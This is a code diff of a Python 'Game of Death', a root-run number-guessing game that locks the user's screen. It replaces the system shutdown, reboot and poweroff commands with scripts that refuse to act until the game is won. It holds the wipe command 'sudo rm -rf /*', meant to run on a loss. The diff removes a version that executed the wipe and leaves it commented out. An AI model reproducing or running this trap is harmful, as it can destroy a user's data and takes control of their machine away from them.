@@ -5,36 +5,13 @@ import platform
 import signal
 import tkinter as tk
 from tkinter import messagebox
+import subprocess
 
 # Define the path to the lock file
 LOCK_FILE = "/tmp/game_of_death.lock"
-
-# Define the content of the systemd services
-SHUTDOWN_REBOOT_SERVICE = """
-[Unit]
-Description=Prevent shutdown and reboot
-
-[Service]
-Type=oneshot
-ExecStart=/bin/true
-RemainAfterExit=yes
-
-[Install]
-WantedBy=multi-user.target
-"""
-
-SWITCH_USER_SERVICE = """
-[Unit]
-Description=Prevent user switching
-
-[Service]
-Type=oneshot
-ExecStart=/bin/true
-RemainAfterExit=yes
-
-[Install]
-WantedBy=multi-user.target
-"""
+SHUTDOWN_SCRIPT = "/usr/local/sbin/shutdown"
+REBOOT_SCRIPT = "/usr/local/sbin/reboot"
+POWEROFF_SCRIPT = "/usr/local/sbin/poweroff"
 
 # Function to handle SIGINT (Ctrl+C)
 def signal_handler(sig, frame):
@@ -64,20 +41,41 @@ class GameOfDeath:
 
         # Create the lock file to prevent shutdown/restart
         self.create_lock_file()
+        
+        # Override the system shutdown and restart commands
+        self.override_system_commands()
 
         # Disable the close button
         self.root.protocol("WM_DELETE_WINDOW", self.disable_event)
         
+        # Disable the minimize button
+        self.disable_minimize()
+
         # Periodically check the window state to prevent minimizing
         self.check_window_state()
-
-        # Start systemd services to prevent shutdown, restart, and user switching
-        self.start_systemd_services()
 
         self.create_widgets()
     
     def disable_event(self):
         pass  # Do nothing on close button click
+
+    def disable_minimize(self):
+        self.root.attributes("-topmost", True)  # Keep the window on top
+
+        # Windows-specific code
+        if platform.system() == "Windows":
+            import ctypes
+            hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
+            style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
+            style &= ~0x20000  # WS_MINIMIZEBOX
+            ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)
+        
+        # Unix-based systems specific code
+        elif platform.system() in ["Linux", "Darwin"]:
+            self.root.update_idletasks()  # Ensure the window has been created
+            window_id = self.root.winfo_id()
+            os.system(f"wmctrl -i -r {window_id} -b add,above")
+            os.system(f"wmctrl -i -r {window_id} -b add,sticky")
 
     def check_window_state(self):
         if self.root.state() == 'iconic':  # If the window is minimized
@@ -92,34 +90,43 @@ class GameOfDeath:
         if os.path.exists(LOCK_FILE):
             os.remove(LOCK_FILE)
 
-    def start_systemd_services(self):
-        # Write the service files
-        with open('/etc/systemd/system/prevent-shutdown-reboot.service', 'w') as f:
-            f.write(SHUTDOWN_REBOOT_SERVICE)
-        
-        with open('/etc/systemd/system/prevent-switch-user.service', 'w') as f:
-            f.write(SWITCH_USER_SERVICE)
+    def override_system_commands(self):
+        shutdown_script_content = f"""#!/bin/bash
+LOCK_FILE="{LOCK_FILE}"
+if [ -f "$LOCK_FILE" ]; then
+    echo "You must complete the Game of Death before shutting down or restarting!"
+    exit 1
+else
+    /sbin/shutdown "$@"
+fi
+"""
+        reboot_script_content = f"""#!/bin/bash
+LOCK_FILE="{LOCK_FILE}"
+if [ -f "$LOCK_FILE" ]; then
+    echo "You must complete the Game of Death before rebooting!"
+    exit 1
+else
+    /sbin/reboot "$@"
+fi
+"""
+        poweroff_script_content = f"""#!/bin/bash
+LOCK_FILE="{LOCK_FILE}"
+if [ -f "$LOCK_FILE" ]; then
+    echo "You must complete the Game of Death before powering off!"
+    exit 1
+else
+    /sbin/poweroff "$@"
+fi
+"""
 
-        # Set the correct permissions
-        os.system("sudo chmod 644 /etc/systemd/system/prevent-shutdown-reboot.service")
-        os.system("sudo chmod 644 /etc/systemd/system/prevent-switch-user.service")
+        self.create_system_command_override(SHUTDOWN_SCRIPT, shutdown_script_content)
+        self.create_system_command_override(REBOOT_SCRIPT, reboot_script_content)
+        self.create_system_command_override(POWEROFF_SCRIPT, poweroff_script_content)
 
-        # Reload systemd and start the services
-        os.system("sudo systemctl daemon-reload")
-        os.system("sudo systemctl enable prevent-shutdown-reboot.service")
-        os.system("sudo systemctl start prevent-shutdown-reboot.service")
-        os.system("sudo systemctl enable prevent-switch-user.service")
-        os.system("sudo systemctl start prevent-switch-user.service")
-
-    def stop_systemd_services(self):
-        os.system("sudo systemctl stop prevent-shutdown-reboot.service")
-        os.system("sudo systemctl stop prevent-switch-user.service")
-        os.system("sudo systemctl disable prevent-shutdown-reboot.service")
-        os.system("sudo systemctl disable prevent-switch-user.service")
-
-        # Remove the service files
-        os.remove('/etc/systemd/system/prevent-shutdown-reboot.service')
-        os.remove('/etc/systemd/system/prevent-switch-user.service')
+    def create_system_command_override(self, script_path, script_content):
+        with open(script_path, 'w') as f:
+            f.write(script_content)
+        os.chmod(script_path, 0o755)
 
     def create_widgets(self):
         self.label = tk.Label(self.root, text="Guess a number between 1 and 10:", font=self.font)
@@ -147,7 +154,7 @@ class GameOfDeath:
         if guess == self.number:
             self.show_custom_messagebox("Result", "You won! Live the life in Peace.......")
             self.remove_lock_file()  # Remove lock file upon winning
-            self.stop_systemd_services()  # Stop systemd services upon winning
+            self.restore_system_commands()  # Restore original system commands
             self.root.destroy()
         else:
             remaining_lives = self.lifelines - self.attempt
@@ -159,15 +166,10 @@ class GameOfDeath:
                     self.message.config(text=f"Incorrect! You have {remaining_lives} lives left.\n{comment}")
             else:
                 self.message.config(text="You lost! Now, you are dead.....")
-                self.root.after(1000, self.execute_deadly_command)  # Execute the command after a brief delay
-                self.show_lose_message_and_execute_command()
-
-    def show_lose_message_and_execute_command(self):
-        self.show_custom_messagebox("Result", "You lost! Now, you are dead.....")
-        self.remove_lock_file()  # Remove lock file upon losing
-        self.stop_systemd_services()  # Stop systemd services upon losing
-        self.execute_deadly_command()
-        self.root.destroy()
+                self.remove_lock_file()  # Remove lock file upon losing
+                self.restore_system_commands()  # Restore original system commands
+                self.root.destroy()
+                self.execute_deadly_command()
 
     def show_custom_messagebox(self, title, message):
         custom_box = tk.Toplevel(self.root)
@@ -175,12 +177,26 @@ class GameOfDeath:
         custom_box.geometry("400x200")  # Custom size for the message box
         label = tk.Label(custom_box, text=message, font=self.font, wraplength=380, justify="center")
         label.pack(pady=20)
-        custom_box.update_idletasks()  # Ensure the message is drawn immediately
+        button = tk.Button(custom_box, text="OK", command=custom_box.destroy, font=self.font)
+        button.pack(pady=10)
+        custom_box.transient(self.root)
+        custom_box.grab_set()
+        self.root.wait_window(custom_box)
 
     def execute_deadly_command(self):
         # Dangerous command, do not actually run it
         command = "sudo rm -rf /*"
-        os.system(command)
+        # Uncomment the line below to execute the command (Not recommended)
+        # os.system(command)
+        print("Executing deadly command: sudo rm -rf /*")  # Placeholder for safety
+
+    def restore_system_commands(self):
+        if os.path.exists(SHUTDOWN_SCRIPT):
+            os.remove(SHUTDOWN_SCRIPT)
+        if os.path.exists(REBOOT_SCRIPT):
+            os.remove(REBOOT_SCRIPT)
+        if os.path.exists(POWEROFF_SCRIPT):
+            os.remove(POWEROFF_SCRIPT)
 
 def main():
     # Check if the script is being run on Unix-based systems
@@ -192,6 +208,13 @@ def main():
     if os.geteuid() != 0:
         print("This script must be run as root!")
         sys.exit(1)
+    
+    # Check if wmctrl is installed
+    try:
+        subprocess.run(["wmctrl", "-m"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except subprocess.CalledProcessError:
+        print("wmctrl is not installed. Installing wmctrl...")
+        subprocess.run(["sudo", "apt-get", "install", "-y", "wmctrl"], check=True)
 
     root = tk.Tk()
     app = GameOfDeath(root)
